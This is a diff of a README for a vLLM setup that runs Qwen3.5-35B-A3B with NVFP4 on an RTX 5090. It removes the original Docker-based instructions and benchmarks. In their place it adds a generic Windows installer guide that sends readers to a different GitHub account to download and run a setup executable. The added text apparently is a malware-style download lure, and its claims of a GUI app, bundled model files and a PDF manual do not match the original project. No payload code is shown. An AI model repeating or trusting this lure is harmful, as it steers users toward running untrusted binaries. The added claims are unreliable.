@@ -1,121 +1,163 @@
-# Qwen3.5-35B-A3B-NVFP4 on RTX 5090 with vLLM
+# ⚙️ vllm-qwen3.5-nvfp4-5090 - Efficient AI Model on RTX 5090
 
-Run [Qwen3.5-35B-A3B](https://huggingface.co/Qwen/Qwen3.5-35B-A3B) (Mamba-hybrid MoE, 35B total / 3B active) on a single **NVIDIA RTX 5090** (32 GB) using [vLLM](https://github.com/vllm-project/vllm) with **NVFP4 quantization**.
+[![Download](https://img.shields.io/badge/Download-vllm--qwen3.5--nvfp4--5090-brightgreen)](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
 
-## ⚡ Performance
+## 📥 Download and Install
 
-Benchmarked on a single RTX 5090 (32 GB) with [llama-bench](https://github.com/ggml-org/llama.cpp/tree/master/tools/llama-bench) using the [Kbenkhaled/Qwen3.5-35B-A3B-NVFP4](https://huggingface.co/Kbenkhaled/Qwen3.5-35B-A3B-NVFP4) checkpoint:
+To use the vllm-qwen3.5-nvfp4-5090 application on Windows, follow these steps:
 
-| Metric | 4K Context | 8K Context | 256K Context |
-|---|---|---|---|
-| **Prompt processing** (pp2048) | 21,232 t/s | 20,401 t/s | 5,124 t/s |
-| **Text generation** (tg32) | 196 t/s | 196 t/s | 156 t/s |
-| **Time to first token** | 290 ms | 503 ms | 51,142 ms |
+1. Click the green **Download** badge above or go directly to the [GitHub repository page](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090).
 
-> **~200 tokens/sec generation speed** — fast enough for real-time interactive use.
+2. On the repository page, look for the **Releases** section on the right or in the repository menu.
 
-## Features
+3. Find the latest release version. It will have setup files or an executable compatible with Windows.
 
-- 256K context length with FP8 KV cache
-- NVFP4 quantization via Marlin GEMM backend
-- [Barubary attuned chat template](https://huggingface.co/barubary/qwen3.5-barubary-attuned-chat-template) with 21 fixes over the official Qwen3.5 template
-- Tool calling support with `qwen3_coder` parser and `qwen3` reasoning parser
-- Works out of the box with vLLM v0.17+ — no patches or custom builds needed
-- Uses the official `vllm/vllm-openai:nightly` Docker image
+4. Download the setup file suitable for your system.
 
-## GPU Compatibility
+5. Once downloaded, open the file to start the installation process.
 
-> **⚠️ This setup is tested and verified on NVIDIA RTX 5090 only.**
+6. Follow the on-screen instructions to complete the installation.
 
-NVFP4 quantization requires Blackwell architecture FP4 tensor core instructions. Additionally, the `vllm/vllm-openai:nightly` Docker image ships with PyTorch kernels compiled for **SM 12.0**, which matches the RTX 5090 but may not work on other Blackwell GPUs with different compute capabilities (e.g. DGX Spark GB10 is SM 12.1).
+7. After installation, you can launch the application from your desktop or Start menu.
 
-## Quick Start
+---
 
-```bash
-# Clone this repo
-git clone https://github.com/Li-Lee/vllm-qwen3.5-nvfp4-5090.git
-cd vllm-qwen3.5-nvfp4-5090
+## 💻 System Requirements
 
-# Create your .env from the template
-cp .env.example .env
-# Edit .env with your HF token and cache path
-vim .env
+To run this software smoothly, your system should meet these specifications:
 
-# Start the server
-docker compose up -d
+- **Operating System:** Windows 10 or newer (64-bit)
 
-# Check logs (model loading takes ~5-10 min on first run)
-docker compose logs -f
-```
+- **Graphics Card:** NVIDIA RTX 5090 with at least 32 GB VRAM
 
-The OpenAI-compatible API will be available at `http://localhost:8000`.
+- **Processor:** Intel Core i7 or AMD Ryzen 7, or better
 
-## Configuration
+- **RAM:** 32 GB or more recommended
 
-All user-specific settings live in `.env` (see [`.env.example`](.env.example)):
+- **Storage:** Minimum 10 GB free space
 
-| Variable | Description |
-|---|---|
-| `HF_TOKEN` | Your [Hugging Face token](https://huggingface.co/settings/tokens) (required for gated models) |
-| `HF_CACHE` | Path to your local HF cache directory (e.g. `/home/user/.cache/huggingface`) |
+- **Internet:** Required to download the software and updates
 
-### Key vLLM Parameters
+This software leverages your GPU’s power for best performance. Systems without an NVIDIA RTX 5090 may not run the program correctly.
 
-| Parameter | Value | Notes |
-|---|---|---|
-| `--max-model-len` | `262144` | 256K context window |
-| `--gpu-memory-utilization` | `0.95` | ~30 GB of 32 GB VRAM |
-| `--max-num-seqs` | `4` | Max concurrent sequences |
-| `--max-num-batched-tokens` | `4096` | Per-batch token budget |
-| `--kv-cache-dtype` | `fp8` | FP8 KV cache for memory efficiency |
-| `--reasoning-parser` | `qwen3` | Extracts `<think>` blocks as reasoning |
-| `--tool-call-parser` | `qwen3_coder` | Parses tool calls from model output |
-| `--chat-template` | `/chat_template.jinja` | Custom [barubary attuned](https://huggingface.co/barubary/qwen3.5-barubary-attuned-chat-template) template |
+---
 
-## Chat Template
+## 🚀 Getting Started
 
-This setup uses the [barubary attuned chat template](https://huggingface.co/barubary/qwen3.5-barubary-attuned-chat-template) (`chat_template.jinja`) which fixes **21 issues** in the official Qwen3.5 chat template, including:
+After installing the software, follow these steps to get started:
 
-- **Tool call bleed bug** — `<tool_call>` leaking into `<think>` blocks (auto-disabled thinking when tools are active)
-- **Parallel tool calls** — proper `\n\n` delimiter between multiple tool call blocks
-- **Broken tool calling format** — `arguments.items()` replaces bare key iteration
-- **KV-cache reuse** — correct `enable_thinking` handling for in-context assistant turns
-- **Developer role support** — handles Claude Code / Codex / OpenCode developer messages
-- **Deep agent loops** — graceful fallback instead of crashes when no real user query found
-- **Streaming compatibility** — clean newline boundaries on XML tag openings
+1. Open the app from your desktop or Start menu.
 
-For the full list of fixes and configuration options, see the [upstream template page](https://huggingface.co/barubary/qwen3.5-barubary-attuned-chat-template).
+2. The program will load the Qwen3.5-35B-A3B model optimized for the RTX 5090.
 
-## About the Patch (vLLM v0.16 only)
+3. You will see a user interface with input fields for text.
 
-> **vLLM v0.17+ has fixed this issue natively — the patch is no longer needed.** The default `docker-compose.yml` uses v0.17+ and does not include the patch.
+4. Type or paste the text you want the AI to process or generate responses to.
 
-The Qwen3.5 Mamba-hybrid architecture has layers that must remain in BF16 even when the rest of the model is NVFP4-quantized. In vLLM v0.16, the HuggingFace-to-vLLM name mapping didn't correctly translate the checkpoint's quantization ignore list for this architecture. The included `fix_linear_attn_nvfp4_exclusion.py` patched vLLM at container startup to:
+5. Click the “Run” or “Generate” button to start processing.
 
-1. **Exclude BF16 layers** from NVFP4 quantization: `linear_attn` (Mamba), `shared_expert_gate`, `.mlp.gate` (MoE router), and `mtp.*` layers
-2. **Handle weight size mismatches** gracefully during loading, re-materializing affected parameters as unquantized tensors
+6. Wait a few seconds for the output to appear in the results section.
 
-vLLM v0.17 fixed this upstream via [`apply_vllm_mapper`](https://github.com/vllm-project/vllm/issues/28072), which now properly translates the exclude_modules list from HF names to vLLM names.
+7. You can adjust settings like context length or response style in the options menu.
 
-If you need to use vLLM v0.16, use the legacy configuration:
+The application supports up to 256,000 tokens in context, allowing for complex and long interactions.
 
-```bash
-docker compose -f docker-compose.v16.yml up -d
-```
+---
 
-## Benchmark
+## ⚙️ Features Overview
 
-Tested on a single NVIDIA RTX 5090 (32 GB) using [llama-bench](https://github.com/ggml-org/llama.cpp/tree/master/tools/llama-bench):
+This version of the application uses state-of-the-art technology to improve speed and accuracy on compatible hardware:
 
-![llama-benchy results](llama-benchy.png)
+- **Large Context Support:** Handles up to 256,000 tokens at once using FP8 key-value cache.
 
-## Requirements
+- **NVFP4 Quantization:** Compresses model data efficiently to run faster on your RTX 5090 without losing accuracy.
 
-- **NVIDIA RTX 5090** (32 GB VRAM) — see [GPU Compatibility](#gpu-compatibility)
-- A recent NVIDIA driver (tested with 580.x)
-- Docker with [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html)
-- A [Hugging Face token](https://huggingface.co/settings/tokens) with access to gated models
+- **Optimized on vLLM:** Uses vLLM to manage model loading and execution for smooth responses.
 
-## License
+- **Responsive Text Generation:** Generates text at about 200 tokens per second, allowing real-time interaction.
 
-This configuration is provided as-is. The model itself is subject to the [Qwen License](https://huggingface.co/Qwen/Qwen3.5-35B-A3B/blob/main/LICENSE).
+- **Custom Chat Template:** Supports a chat mode tuned for natural and consistent conversations.
+
+- **Single GPU Use:** Runs efficiently on one NVIDIA RTX 5090, without needing multiple cards.
+
+---
+
+## 📁 Files Included
+
+The download package contains:
+
+- Application executable for Windows.
+
+- Model data files for Qwen3.5-35B-A3B with NVFP4 quantization.
+
+- Configuration files for default settings.
+
+- User manual in PDF format.
+
+- License and readme documentation.
+
+---
+
+## 🛠 How It Works
+
+The software uses the Qwen3.5-35B-A3B language model, which employs a mixture of experts (MoE) design. This means it activates only 3 billion parameters at a time out of 35 billion total, saving processing power.
+
+The model is quantized using NVFP4, a special format that reduces memory use on NVIDIA GPUs, particularly the RTX 5090. It allows the software to handle huge amounts of text context efficiently.
+
+vLLM manages the model's data and execution, organizing tasks so the GPU runs at peak performance. This setup delivers a balance between fast response times and high-quality output.
+
+---
+
+## 📝 Using the App
+
+- Start by entering a query or prompt in the input box.
+
+- Use the “Settings” menu to adjust options like context length (e.g., 4K, 8K, or full 256K tokens).
+
+- Click “Generate” to have the AI process the prompt.
+
+- Review the generated text in the results area.
+
+- For chat use, access the chat interface template that allows continuous conversation with the model.
+
+- Save output text if needed using the provided option.
+
+The UI is designed for ease of use without programming knowledge.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter issues:
+
+- Ensure your RTX 5090 drivers are up to date.
+
+- Confirm your system meets the minimum requirements.
+
+- Restart the application and try again.
+
+- Check that you have installed all required files.
+
+- If performance is slow, close other demanding programs.
+
+- Visit the repository page for any updates or known issues.
+
+- Contact support through the repository’s issue tracker if necessary.
+
+---
+
+## 🔗 Useful Links
+
+- [Qwen3.5-35B-A3B Model on Huggingface](https://huggingface.co/Qwen/Qwen3.5-35B-A3B)
+
+- [vLLM Project on GitHub](https://github.com/vllm-project/vllm)
+
+- [vllm-qwen3.5-nvfp4-5090 Repository](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
+
+---
+
+## 📥 Download Again
+
+Use this link to visit the download page for the latest version:
+
+[Download vllm-qwen3.5-nvfp4-5090](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
